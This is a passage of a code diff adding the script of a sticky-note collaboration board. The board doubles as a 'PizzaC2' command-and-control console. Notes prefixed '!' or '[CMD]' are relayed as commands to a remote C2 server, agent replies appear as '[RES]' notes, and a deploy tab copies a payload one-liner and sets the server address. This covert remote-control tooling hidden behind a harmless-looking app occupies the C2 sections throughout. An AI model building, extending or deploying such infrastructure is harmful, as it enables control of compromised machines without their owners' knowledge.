+                saveRoomData('roomPresence', presence);
+                renderUsers();
+              }
+            }
+          }
+        } catch (e) {}
+      },
+
+      async postNote(code, noteObj) {
+        if (this.isConnected && code) {
+          try {
+            await fetch(`${this.serverUrl}/api/rooms/${code}/notes`, {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify(noteObj),
+              mode: 'cors'
+            });
+          } catch (e) {}
+        }
+      },
+
+      async deleteNote(code, noteId) {
+        if (this.isConnected && code) {
+          try {
+            await fetch(`${this.serverUrl}/api/rooms/${code}/notes/${encodeURIComponent(noteId)}`, {
+              method: 'DELETE',
+              mode: 'cors'
+            });
+          } catch (e) {}
+        }
+      },
+
+      async heartbeat(code, presenceObj) {
+        if (this.isConnected && code) {
+          try {
+            await fetch(`${this.serverUrl}/api/rooms/${code}/presence`, {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify(presenceObj),
+              mode: 'cors'
+            });
+          } catch (e) {}
+        }
+      },
+
+      async registerRoom(code, adminCode, host) {
+        if (this.isConnected && code) {
+          try {
+            await fetch(`${this.serverUrl}/api/rooms`, {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({ code, adminCode, host }),
+              mode: 'cors'
+            });
+          } catch (e) {}
+        }
+      }
+    };
+
+    // Language & Theme State
+    let currentLang = localStorage.getItem('lang') || 'en';
+    let currentTheme = localStorage.getItem('theme') || (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light');
+    let deletePhrase = translations[currentLang]?.deletePhrase || 'DELETE';
+
+    function applyTheme(theme) {
+      currentTheme = theme;
+      document.documentElement.setAttribute('data-theme', theme);
+      localStorage.setItem('theme', theme);
+      const ariaLabel = translations[currentLang]?.themeAria || 'Toggle Theme';
+      document.querySelectorAll('.theme-toggle').forEach((btn) => btn.setAttribute('aria-label', ariaLabel));
+    }
+
+    function toggleTheme() {
+      applyTheme(currentTheme === 'dark' ? 'light' : 'dark');
+    }
+
+    document.querySelectorAll('.theme-toggle').forEach((btn) => btn.addEventListener('click', toggleTheme));
+
+    function applyLanguage(lang) {
+      currentLang = lang;
+      localStorage.setItem('lang', lang);
+      const t = translations[lang];
+      deletePhrase = t.deletePhrase;
+
+      // Update static data-i18n elements
+      document.querySelectorAll('[data-i18n]').forEach((el) => {
+        const key = el.getAttribute('data-i18n');
+        if (t[key] !== undefined) {
+          if (key.includes('Title') || key.includes('Desc')) {
+            el.innerHTML = t[key];
+          } else {
+            el.textContent = t[key];
+          }
+        }
+      });
+
+      // Update inputs & placeholders
+      if (entryCode) entryCode.placeholder = t.phEntryCode;
+      if (adminCodeInput) adminCodeInput.placeholder = t.phAdminCode;
+      if (nickname) nickname.placeholder = t.phNickname;
+      if (searchInput) {
+        searchInput.placeholder = t.searchPlaceholder;
+        searchInput.setAttribute('aria-label', t.searchPlaceholder);
+      }
+      if (noteText) noteText.placeholder = t.modalPlaceholder;
+      if (deleteConfirmInput) deleteConfirmInput.placeholder = t.deletePhrase;
+
+      // Update delete button state
+      if (confirmDeleteButton && deleteConfirmInput) {
+        confirmDeleteButton.disabled = deleteConfirmInput.value !== deletePhrase;
+      }
+
+      // Update role buttons
+      if (normalRoleButton) normalRoleButton.textContent = t.roleNormal;
+      if (adminRoleButton) adminRoleButton.textContent = t.roleAdmin;
+
+      // Update entry button label
+      if (entryButton) {
+        if (nicknameArea && nicknameArea.classList.contains('visible')) {
+          entryButton.textContent = t.btnEntryJoin;
+        } else if (inputArea && inputArea.classList.contains('visible')) {
+          entryButton.textContent = t.btnEntryCheck;
+        } else {
+          entryButton.textContent = t.btnEntryInit;
+        }
+      }
+
+      // Update welcome text & title
+      if (currentRoomCode) {
+        document.title = t.pageTitleBoard;
+        if (welcomeSuffix) welcomeSuffix.textContent = t.welcomeSuffix;
+      } else {
+        document.title = t.pageTitleLounge;
+      }
+
+      // Update active state on language switch buttons
+      document.querySelectorAll('.lang-btn').forEach((btn) => {
+        btn.classList.toggle('active', btn.getAttribute('data-lang') === lang);
+      });
+
+      // Update theme toggle aria-label
+      document.querySelectorAll('.theme-toggle').forEach((btn) => {
+        btn.setAttribute('aria-label', t.themeAria);
+      });
+
+      // Re-render dynamic components
+      renderUsers();
+      renderNotes();
+    }
+
+    document.querySelectorAll('.lang-btn').forEach((btn) => {
+      btn.addEventListener('click', () => {
+        const selectedLang = btn.getAttribute('data-lang');
+        if (selectedLang) applyLanguage(selectedLang);
+      });
+    });
+
+    function readRoomData(key) {
+      try { return JSON.parse(localStorage.getItem(key) || '{}'); } catch (error) { return {}; }
+    }
+
+    function saveRoomData(key, data) {
+      localStorage.setItem(key, JSON.stringify(data));
+    }
+
+    function getRoomSettings(code) {
+      const settings = readRoomData('roomSettings');
+      return settings[code] || { active: true };
+    }
+
+    function broadcastRoomEvent(event) {
+      const events = readRoomData('roomEvents');
+      const eventList = Array.isArray(events) ? events : [];
+      eventList.push({ ...event, id: `${sessionId}-${Date.now()}` });
+      saveRoomData('roomEvents', eventList.slice(-30));
+    }
+
+    function isSessionKicked() {
+      const kicked = readRoomData('roomKicks');
+      return Array.isArray(kicked[currentRoomCode]) && kicked[currentRoomCode].includes(sessionId);
+    }
+
+    function leaveRoom(message) {
+      if (leavingRoom) return;
+      leavingRoom = true;
+      const presence = readRoomData('roomPresence');
+      delete presence[sessionId];
+      saveRoomData('roomPresence', presence);
+      if (message) window.alert(message);
+      window.location.reload();
+    }
+
+    function renderUsers() {
+      if (!currentRoomCode) return;
+      const t = translations[currentLang];
+      const presence = readRoomData('roomPresence');
+      const now = Date.now();
+      const users = Object.values(presence)
+        .filter((user) => user.code === currentRoomCode && now - user.lastSeen < 15000)
+        .sort((a, b) => Number(b.isHost) - Number(a.isHost));
+      userList.replaceChildren();
+      users.forEach((user) => {
+        const row = document.createElement('div');
+        row.className = 'user';
+        const isAgent = Boolean(user.isAgent || (user.name && user.name.includes('Agent-')));
+        if (isAgent) row.classList.add('is-agent');
+
+        const avatar = document.createElement('span');
+        avatar.className = 'avatar';
+        avatar.textContent = isAgent ? '🤖' : (user.id === sessionId ? t.myBadge : user.name.slice(0, 1));
+        const name = document.createElement('span');
+        name.textContent = user.name;
+        row.append(avatar, name);
+
+        if (isAgent) {
+          const agentBadge = document.createElement('span');
+          agentBadge.className = 'agent-pill';
+          agentBadge.textContent = 'AGENT';
+          row.appendChild(agentBadge);
+        }
+
+        if (user.isHost) {
+          const crown = document.createElement('span');
+          crown.className = 'host-crown visible';
+          crown.textContent = '👑';
+          crown.setAttribute('aria-label', t.hostAria);
+          row.appendChild(crown);
+        }
+        if (isHost && !user.isHost) {
+          const kick = document.createElement('button');
+          kick.className = 'kick-button';
+          kick.type = 'button';
+          kick.textContent = t.kickButton;
+          kick.addEventListener('click', () => kickUser(user.id));
+          row.appendChild(kick);
+        }
+        const dot = document.createElement('span');
+        dot.className = 'online-dot';
+        row.appendChild(dot);
+        userList.appendChild(row);
+      });
+      userCount.textContent = `${users.length}${t.userCountSuffix}`;
+    }
+
+    function kickUser(targetId) {
+      if (!isHost || targetId === sessionId) return;
+      const kicked = readRoomData('roomKicks');
+      if (!Array.isArray(kicked[currentRoomCode])) kicked[currentRoomCode] = [];
+      if (!kicked[currentRoomCode].includes(targetId)) kicked[currentRoomCode].push(targetId);
+      saveRoomData('roomKicks', kicked);
+      const presence = readRoomData('roomPresence');
+      delete presence[targetId];
+      saveRoomData('roomPresence', presence);
+      renderUsers();
+    }
+
+    function updatePresence() {
+      if (!currentRoomCode) return;
+      if (isSessionKicked()) {
+        leaveRoom(translations[currentLang].alertKicked);
+        return;
+      }
+      const presence = readRoomData('roomPresence');
+      const now = Date.now();
+      Object.keys(presence).forEach((id) => {
+        if (now - presence[id].lastSeen >= 15000) delete presence[id];
+      });
+      presence[sessionId] = { id: sessionId, code: currentRoomCode, name: welcomeName.textContent, isHost, isAgent: false, lastSeen: now };
+      saveRoomData('roomPresence', presence);
+      renderUsers();
+      C2.heartbeat(currentRoomCode, { id: sessionId, name: welcomeName.textContent, isHost, isAgent: false });
+    }
+
+    generateButton.addEventListener('click', () => {
+      activeCode = String(Math.floor(100000 + Math.random() * 900000));
+      activeAdminCode = String(Math.floor(100000 + Math.random() * 900000));
+      while (activeAdminCode === activeCode) activeAdminCode = String(Math.floor(100000 + Math.random() * 900000));
+      const generatedRooms = readRoomData('generatedRooms');
+      const roomAdminCodes = readRoomData('roomAdminCodes');
+      generatedRooms[activeCode] = true;
+      roomAdminCodes[activeCode] = activeAdminCode;
+      saveRoomData('generatedRooms', generatedRooms);
+      saveRoomData('roomAdminCodes', roomAdminCodes);
+      codeValue.textContent = activeCode;
+      adminCodeValue.textContent = activeAdminCode;
+      generatedCode.classList.add('visible');
+      generatedAdminCode.classList.add('visible');
+      generateMessage.textContent = translations[currentLang].msgGenerated;
+      generateMessage.classList.remove('error');
+
+      // Register with C2 Server
+      C2.registerRoom(activeCode, activeAdminCode, 'Host');
+      C2.updatePayloadUI(activeCode);
+    });
+
+    copyButton.addEventListener('click', async () => {
+      try { await navigator.clipboard.writeText(activeCode); } catch (error) {}
+      copyButton.textContent = translations[currentLang].copied;
+      setTimeout(() => { copyButton.textContent = translations[currentLang].copy; }, 1600);
+    });
+
+    copyAdminButton.addEventListener('click', async () => {
+      try { await navigator.clipboard.writeText(activeAdminCode); } catch (error) {}
+      copyAdminButton.textContent = translations[currentLang].copied;
+      setTimeout(() => { copyAdminButton.textContent = translations[currentLang].copy; }, 1600);
+    });
+
+    entryButton.addEventListener('click', async () => {
+      const t = translations[currentLang];
+      if (!inputArea.classList.contains('visible')) {
+        inputArea.classList.add('visible');
+        roleChoice.classList.add('visible');
+        entryButton.textContent = t.btnEntryCheck;
+        entryCode.focus();
+        entryMessage.textContent = '';
+        return;
+      }
+
+      if (!/^\d{6}$/.test(entryCode.value.trim())) {
+        entryMessage.textContent = t.errDigits6;
+        entryMessage.classList.add('error');
+        entryCode.focus();
+        return;
+      }
+      const code = entryCode.value.trim();
+      const generatedRooms = readRoomData('generatedRooms');
+      const roomAdminCodes = readRoomData('roomAdminCodes');
+      const roomHosts = readRoomData('roomHosts');
+      const deletedRooms = readRoomData('deletedRooms');
+      if (deletedRooms[code]) {
+        entryMessage.textContent = t.errDeletedRoom;
+        entryMessage.classList.add('error');
+        entryCode.focus();
+        return;
+      }
+      if (generatedRooms[code] && getRoomSettings(code).active === false && !wantsAdmin) {
+        entryMessage.textContent = t.errCodeOff;
+        entryMessage.classList.add('error');
+        entryCode.focus();
+        return;
+      }
+      if (wantsAdmin) {
+        const adminCode = adminCodeInput.value.trim();
+        if (!/^\d{6}$/.test(adminCode)) {
+          entryMessage.textContent = t.errAdminDigits6;
+          entryMessage.classList.add('error');
+          adminCodeInput.focus();
+          return;
+        }
+        if (!roomAdminCodes[code] || roomAdminCodes[code] !== adminCode) {
+          entryMessage.textContent = t.errWrongCode;
+          entryMessage.classList.add('error');
+          adminCodeInput.focus();
+          return;
+        }
+      }
+      const enteringAsAdmin = wantsAdmin && roomAdminCodes[code] === adminCodeInput.value.trim();
+      if (nicknameArea.classList.contains('visible')) {
+        if (nickname.value.trim().length < 1) {
+          entryMessage.textContent = t.errNicknameRequired;
+          entryMessage.classList.add('error');
+          nickname.focus();
+          return;
+        }
+        const name = nickname.value.trim();
+        if (enteringAsAdmin) {
+          roomHosts[code] = name;
+          saveRoomData('roomHosts', roomHosts);
+        }
+        isHost = enteringAsAdmin;
+        currentRoomCode = code;
+        welcomeName.textContent = name;
+        welcomeSuffix.textContent = t.welcomeSuffix;
+        myUserName.textContent = name;
+        myAvatar.textContent = name.slice(0, 1);
+        myCrown.classList.toggle('visible', isHost);
+        const roomSettings = getRoomSettings(code);
+        codeEnabled.checked = roomSettings.active !== false;
+        codeStatus.textContent = codeEnabled.checked ? 'ON' : 'OFF';
+        hostControls.classList.toggle('visible', isHost);
+        C2.registerRoom(code, roomAdminCodes[code] || '', name);
+        C2.updatePayloadUI(code);
+        C2.syncRoom(code);
+        updatePresence();
+        renderNotes();
+        shell.style.display = 'none';
+        appPage.classList.add('visible');
+        document.title = t.pageTitleBoard;
+        return;
+      }
+      nicknameArea.classList.add('visible');
+      entryButton.textContent = t.btnEntryJoin;
+      entryMessage.textContent = t.msgCodeVerified;
+      entryMessage.classList.remove('error');
+      nickname.focus();
+    });
+
+    nickname.addEventListener('input', () => { entryMessage.textContent = ''; });
+    entryCode.addEventListener('input', () => {
+      entryCode.value = entryCode.value.replace(/\D/g, '').slice(0, 6);
+      entryMessage.textContent = '';
+    });
+    adminCodeInput.addEventListener('input', () => {
+      adminCodeInput.value = adminCodeInput.value.replace(/\D/g, '').slice(0, 6);
+      entryMessage.textContent = '';
+    });
+    normalRoleButton.addEventListener('click', () => {
+      wantsAdmin = false;
+      normalRoleButton.classList.add('selected');
+      adminRoleButton.classList.remove('selected');
+      adminInputArea.classList.remove('visible');
+      entryMessage.textContent = '';
+    });
+    adminRoleButton.addEventListener('click', () => {
+      wantsAdmin = true;
+      adminRoleButton.classList.add('selected');
+      normalRoleButton.classList.remove('selected');
+      adminInputArea.classList.add('visible');
+      adminCodeInput.focus();
+      entryMessage.textContent = '';
+    });
+
+    function makeRoomCode() {
+      const generatedRooms = readRoomData('generatedRooms');
+      let nextCode = '';
+      do { nextCode = String(Math.floor(100000 + Math.random() * 900000)); } while (generatedRooms[nextCode]);
+      return nextCode;
+    }
+
+    rotateCodeButton.addEventListener('click', () => {
+      if (!isHost || !currentRoomCode) return;
+      const oldCode = currentRoomCode;
+      const newCode = makeRoomCode();
+      const generatedRooms = readRoomData('generatedRooms');
+      const roomAdminCodes = readRoomData('roomAdminCodes');
+      const roomHosts = readRoomData('roomHosts');
+      const roomSettings = readRoomData('roomSettings');
+      const roomNotes = readRoomData('roomNotes');
+      const roomNoteCounts = readRoomData('roomNoteCounts');
+      generatedRooms[newCode] = true;
+      delete generatedRooms[oldCode];
+      roomAdminCodes[newCode] = makeRoomCode();
+      delete roomAdminCodes[oldCode];
+      roomHosts[newCode] = roomHosts[oldCode];
+      delete roomHosts[oldCode];
+      roomSettings[newCode] = roomSettings[oldCode] || { active: true };
+      delete roomSettings[oldCode];
+      roomNotes[newCode] = roomNotes[oldCode] || [];
+      delete roomNotes[oldCode];
+      roomNoteCounts[newCode] = roomNoteCounts[oldCode] || 0;
+      delete roomNoteCounts[oldCode];
+      saveRoomData('generatedRooms', generatedRooms);
+      saveRoomData('roomAdminCodes', roomAdminCodes);
+      saveRoomData('roomHosts', roomHosts);
+      saveRoomData('roomSettings', roomSettings);
+      saveRoomData('roomNotes', roomNotes);
+      saveRoomData('roomNoteCounts', roomNoteCounts);
+      const presence = readRoomData('roomPresence');
+      Object.keys(presence).forEach((id) => { if (presence[id].code === oldCode) presence[id].code = newCode; });
+      currentRoomCode = newCode;
+      activeCode = newCode;
+      activeAdminCode = roomAdminCodes[newCode];
+      presence[sessionId] = { id: sessionId, code: newCode, name: welcomeName.textContent, isHost: true, lastSeen: Date.now() };
+      saveRoomData('roomPresence', presence);
+      broadcastRoomEvent({ type: 'rotate', oldCode, newCode });
+      renderUsers();
+      renderNotes();
+      const alertMsg = translations[currentLang].alertRotate
+        .replace('{code}', newCode)
+        .replace('{adminCode}', activeAdminCode);
+      window.alert(alertMsg);
+    });
+
+    codeEnabled.addEventListener('change', () => {
+      if (!isHost || !currentRoomCode) return;
+      const settings = readRoomData('roomSettings');
+      settings[currentRoomCode] = { active: codeEnabled.checked };
+      saveRoomData('roomSettings', settings);
+      codeStatus.textContent = codeEnabled.checked ? 'ON' : 'OFF';
+    });
+
+    deleteRoomButton.addEventListener('click', () => {
+      if (!isHost) return;
+      deleteConfirmInput.value = '';
+      confirmDeleteButton.disabled = true;
+      deleteRoomModal.classList.add('visible');
+      deleteConfirmInput.focus();
+    });
+    cancelDeleteButton.addEventListener('click', () => deleteRoomModal.classList.remove('visible'));
+    deleteRoomModal.addEventListener('click', (event) => {
+      if (event.target === deleteRoomModal) deleteRoomModal.classList.remove('visible');
+    });
+    deleteConfirmInput.addEventListener('input', () => {
+      confirmDeleteButton.disabled = deleteConfirmInput.value !== deletePhrase;
+    });
+    deleteRoomForm.addEventListener('submit', (event) => {
+      event.preventDefault();
+      if (!isHost || deleteConfirmInput.value !== deletePhrase) return;
+      const code = currentRoomCode;
+      const generatedRooms = readRoomData('generatedRooms');
+      const roomAdminCodes = readRoomData('roomAdminCodes');
+      const roomHosts = readRoomData('roomHosts');
+      const roomSettings = readRoomData('roomSettings');
+      const roomNotes = readRoomData('roomNotes');
+      const roomNoteCounts = readRoomData('roomNoteCounts');
+      const deletedRooms = readRoomData('deletedRooms');
+      delete generatedRooms[code];
+      delete roomAdminCodes[code];
+      delete roomHosts[code];
+      delete roomSettings[code];
+      delete roomNotes[code];
+      delete roomNoteCounts[code];
+      deletedRooms[code] = true;
+      saveRoomData('generatedRooms', generatedRooms);
+      saveRoomData('roomAdminCodes', roomAdminCodes);
+      saveRoomData('roomHosts', roomHosts);
+      saveRoomData('roomSettings', roomSettings);
+      saveRoomData('roomNotes', roomNotes);
+      saveRoomData('roomNoteCounts', roomNoteCounts);
+      saveRoomData('deletedRooms', deletedRooms);
+      const presence = readRoomData('roomPresence');
+      Object.keys(presence).forEach((id) => { if (presence[id].code === code) delete presence[id]; });
+      saveRoomData('roomPresence', presence);
+      broadcastRoomEvent({ type: 'delete', code });
+      window.location.reload();
+    });
+
+    window.addEventListener('storage', (event) => {
+      if (event.key === 'roomPresence') renderUsers();
+      if (event.key === 'roomNotes') renderNotes();
+      if (event.key === 'roomKicks' && isSessionKicked()) leaveRoom(translations[currentLang].alertKicked);
+      if (event.key === 'roomEvents') {
+        const events = readRoomData('roomEvents');
+        const latest = Array.isArray(events) ? [...events].reverse().find((roomEvent) => roomEvent.type === 'delete' ? roomEvent.code === currentRoomCode : roomEvent.oldCode === currentRoomCode) : null;
+        if (latest?.type === 'delete') leaveRoom(translations[currentLang].alertDeleted);
+        if (latest?.type === 'rotate') {
+          currentRoomCode = latest.newCode;
+          activeCode = latest.newCode;
+          renderUsers();
+          renderNotes();
+          updatePresence();
+        }
+      }
+    });
+    window.setInterval(updatePresence, 4000);
+    window.addEventListener('beforeunload', () => {
+      if (!currentRoomCode) return;
+      const presence = readRoomData('roomPresence');
+      delete presence[sessionId];
+      saveRoomData('roomPresence', presence);
+    });
+
+    searchButton.addEventListener('click', () => {
+      searchBox.classList.toggle('visible');
+      if (searchBox.classList.contains('visible')) searchInput.focus();
+      else { searchInput.value = ''; filterNotes(''); }
+    });
+
+    function getRoomNotes() {
+      const allNotes = readRoomData('roomNotes');
+      return Array.isArray(allNotes[currentRoomCode]) ? allNotes[currentRoomCode] : [];
+    }
+
+    function openEditModal(note) {
+      editingNoteId = note.id;
+      noteModalTitle.textContent = translations[currentLang].modalEditTitle.replace('{n}', note.number);
+      noteSubmitButton.textContent = translations[currentLang].modalSave;
+      noteText.value = note.text;
+      noteModal.classList.add('visible');
+      noteText.focus();
+    }
+
+    function matchesNote(note, query) {
+      const text = query.trim().toLowerCase();
+      if (!text) return true;
+      if (/^#\d+$/.test(text)) return `#${note.number}` === text;
+      return `#${note.number} ${note.author} ${note.text}`.toLowerCase().includes(text);
+    }
+
+    function createNoteElement(note, index, query) {
+      const t = translations[currentLang];
+      const element = document.createElement('article');
+      element.className = 'note';
+      const text = String(note.text || '');
+      const isCmd = text.startsWith('!') || text.startsWith('[CMD]');
+      const isRes = text.startsWith('[RES]') || text.startsWith('[OUTPUT]');
+      if (isCmd) element.classList.add('c2-cmd');
+      if (isRes) element.classList.add('c2-res');
+
+      const noteWidth = isRes ? Math.min(380, board.clientWidth - 30) : Math.min(330, board.clientWidth - 30);
+      const columns = Math.max(1, Math.floor((board.clientWidth - 20) / (noteWidth + 15)));
+      const column = index % columns;
+      const row = Math.floor(index / columns);
+      element.style.left = `${15 + column * (noteWidth + 15)}px`;
+      element.style.top = `${25 + row * (isRes ? 220 : 180)}px`;
+
+      // Check if response exists for this command note
+      const allNotes = getRoomNotes();
+      const hasResponse = isCmd && allNotes.some(n => n.text && n.text.includes(`[RES] #${note.number}`));
+
+      let badgeHtml = '';
+      if (isCmd) {
+        badgeHtml = `<span class="c2-badge cmd">CMD</span>` + 
+          (hasResponse ? `<span class="c2-badge done">✓ Done</span>` : `<span class="c2-badge pending">⏳ Pending</span>`);
+      } else if (isRes) {
+        badgeHtml = `<span class="c2-badge res">AGENT RES</span>`;
+      }
+
+      element.innerHTML = `<div class="note-head"><span class="note-number"></span><div class="note-author-wrap"><span class="note-author"></span>${badgeHtml}</div><span class="note-actions"><button class="note-edit" type="button">${t.noteEdit}</button><button class="note-close" type="button" aria-label="${t.noteDeleteAria}">×</button></span></div><p></p><button class="note-copy" type="button">${t.noteCopy}</button>`;
+      element.querySelector('.note-number').textContent = `#${note.number}`;
+      element.querySelector('.note-author').textContent = note.author;
+      element.querySelector('p').textContent = note.text;
+      const matched = matchesNote(note, query);
+      element.style.display = matched ? 'block' : 'none';
+      if (/^#\d+$/.test(query.trim()) && matched) {
+        element.classList.add('search-match');
+      }
+      element.querySelector('.note-close').addEventListener('click', () => {
+        const allNotes = readRoomData('roomNotes');
+        allNotes[currentRoomCode] = getRoomNotes().filter((roomNote) => roomNote.id !== note.id);
+        saveRoomData('roomNotes', allNotes);
+        renderNotes();
+        C2.deleteNote(currentRoomCode, note.id);
+      });
+      element.querySelector('.note-edit').addEventListener('click', () => openEditModal(note));
+      element.querySelector('.note-copy').addEventListener('click', async (copyEvent) => {
+        const copyBtn = copyEvent.currentTarget;
+        try { await navigator.clipboard.writeText(note.text); } catch (error) {}
+        copyBtn.textContent = translations[currentLang].noteCopied;
+        setTimeout(() => { copyBtn.textContent = translations[currentLang].noteCopy; }, 1400);
+      });
+      return element;
+    }
+
+    function renderNotes(query = searchInput.value) {
+      if (!currentRoomCode) return;
+      board.querySelectorAll('.note').forEach((note) => note.remove());
+      const notes = getRoomNotes();
+      boardEmpty.style.display = notes.length ? 'none' : 'grid';
+      notes.forEach((note, index) => board.appendChild(createNoteElement(note, index, query)));
+    }
+
+    function filterNotes(query) {
+      renderNotes(query);
+      if (/^#\d+$/.test(query.trim())) {
+        requestAnimationFrame(() => {
+          document.querySelectorAll('.note.search-match').forEach((note) => {
+            note.classList.remove('search-match');
+            void note.offsetWidth;
+            note.classList.add('search-match');
+          });
+        });
+      }
+    }
+    searchInput.addEventListener('input', (event) => filterNotes(event.target.value));
+
+    function openNoteModal() {
+      editingNoteId = '';
+      noteModalTitle.textContent = translations[currentLang].modalNewTitle;
+      noteSubmitButton.textContent = translations[currentLang].modalPost;
+      noteModal.classList.add('visible');
+      noteText.focus();
+    }
+    function closeNoteModal() {
+      editingNoteId = '';
+      noteModal.classList.remove('visible');
+      noteText.value = '';
+      noteModalTitle.textContent = translations[currentLang].modalNewTitle;
+      noteSubmitButton.textContent = translations[currentLang].modalPost;
+    }
+    addButton.addEventListener('click', openNoteModal);
+    cancelNote.addEventListener('click', closeNoteModal);
+    noteModal.addEventListener('click', (event) => { if (event.target === noteModal) closeNoteModal(); });
+    document.addEventListener('keydown', (event) => { if (event.key === 'Escape') closeNoteModal(); });
+
+    noteForm.addEventListener('submit', (event) => {
+      event.preventDefault();
+      const text = noteText.value.trim();
+      if (!text) return;
+      if (editingNoteId) {
+        const allNotes = readRoomData('roomNotes');
+        const roomNotes = getRoomNotes().map((note) => note.id === editingNoteId ? { ...note, text } : note);
+        allNotes[currentRoomCode] = roomNotes;
+        saveRoomData('roomNotes', allNotes);
+        renderNotes();
+        closeNoteModal();
+        return;
+      }
+      const noteCounts = readRoomData('roomNoteCounts');
+      noteCount = (noteCounts[currentRoomCode] || 0) + 1;
+      noteCounts[currentRoomCode] = noteCount;
+      saveRoomData('roomNoteCounts', noteCounts);
+      const allNotes = readRoomData('roomNotes');
+      const roomNotes = Array.isArray(allNotes[currentRoomCode]) ? allNotes[currentRoomCode] : [];
+      const newNote = { id: `${sessionId}-${noteCount}`, number: noteCount, text, author: welcomeName.textContent };
+      roomNotes.push(newNote);
+      allNotes[currentRoomCode] = roomNotes;
+      saveRoomData('roomNotes', allNotes);
+      renderNotes();
+      C2.postNote(currentRoomCode, newNote);
+      closeNoteModal();
+    });
+
+    // PizzaC2 Modal Listeners
+    if (c2ModalButton) {
+      c2ModalButton.addEventListener('click', () => {
+        C2.updatePayloadUI(currentRoomCode);
+        C2.checkConnection();
+        c2Modal.classList.add('visible');
+      });
+    }
+    if (closeC2Modal) {
+      closeC2Modal.addEventListener('click', () => c2Modal.classList.remove('visible'));
+    }
+    if (c2Modal) {
+      c2Modal.addEventListener('click', (e) => {
+        if (e.target === c2Modal) c2Modal.classList.remove('visible');
+      });
+    }
+
+    c2TabBtns.forEach(btn => {
+      btn.addEventListener('click', () => {
+        c2TabBtns.forEach(b => b.classList.remove('active'));
+        c2TabContents.forEach(c => c.classList.remove('active'));
+        btn.classList.add('active');
+        const tab = btn.getAttribute('data-tab');
+        if (tab === 'deploy') document.querySelector('#c2TabDeploy').classList.add('active');
+        if (tab === 'command') document.querySelector('#c2TabCommand').classList.add('active');
+        if (tab === 'config') document.querySelector('#c2TabConfig').classList.add('active');
+      });
+    });
+
+    if (copyOneLinerBtn) {
+      copyOneLinerBtn.addEventListener('click', async () => {
+        try {
+          await navigator.clipboard.writeText(c2OneLinerCode.textContent);
+          copyOneLinerBtn.textContent = '복사 완료!';
+          setTimeout(() => { copyOneLinerBtn.textContent = '복사'; }, 1500);
+        } catch (e) {}
+      });
+    }
+
+    function sendCommandAsSticker(cmdText) {
+      if (!currentRoomCode) return;
+      const noteCounts = readRoomData('roomNoteCounts');
+      noteCount = (noteCounts[currentRoomCode] || 0) + 1;
+      noteCounts[currentRoomCode] = noteCount;
+      saveRoomData('roomNoteCounts', noteCounts);
+      const allNotes = readRoomData('roomNotes');
+      const roomNotes = Array.isArray(allNotes[currentRoomCode]) ? allNotes[currentRoomCode] : [];
+      const newNote = {
+        id: `${sessionId}-${noteCount}`,
+        number: noteCount,
+        text: cmdText,
+        author: welcomeName.textContent || 'Operator',
+        isCommand: true
+      };
+      roomNotes.push(newNote);
+      allNotes[currentRoomCode] = roomNotes;
+      saveRoomData('roomNotes', allNotes);
+      renderNotes();
+      C2.postNote(currentRoomCode, newNote);
+      c2Modal.classList.remove('visible');
+    }
+
+    c2CmdChips.forEach(chip => {
+      chip.addEventListener('click', () => {
+        const cmd = chip.getAttribute('data-cmd');
+        sendCommandAsSticker(cmd);
+      });
+    });
+
+    if (c2SendCmdBtn && c2CustomCmdInput) {
+      c2SendCmdBtn.addEventListener('click', () => {
+        const cmd = c2CustomCmdInput.value.trim();
+        if (cmd) {
+          sendCommandAsSticker(cmd.startsWith('!') || cmd.startsWith('[CMD]') ? cmd : `!${cmd}`);
+          c2CustomCmdInput.value = '';
+        }
+      });
+      c2CustomCmdInput.addEventListener('keydown', (e) => {
+        if (e.key === 'Enter' && !e.shiftKey) {
+          e.preventDefault();
+          c2SendCmdBtn.click();
+        }
+      });
+    }
+
+    if (c2SaveConfigBtn && c2ServerUrlInput) {
+      c2SaveConfigBtn.addEventListener('click', async () => {
+        const url = c2ServerUrlInput.value.trim().replace(/\/+$/, '');
+        C2.serverUrl = url;
+        localStorage.setItem('c2_server_url', url);
+        c2SaveConfigBtn.textContent = '연결 확인 중...';
+        const ok = await C2.checkConnection();
+        c2SaveConfigBtn.textContent = ok ? '연결 성공 & 저장됨!' : '연결 실패 (주소 확인)';
+        C2.updatePayloadUI(currentRoomCode);
+        setTimeout(() => { c2SaveConfigBtn.textContent = '연결 테스트 및 저장'; }, 2000);
+      });
+    }
+
+    // Initialize Theme, Language & PizzaC2
+    applyTheme(currentTheme);
+    applyLanguage(currentLang);
+    C2.init();
+  </script>
+</body>
+</html>
+
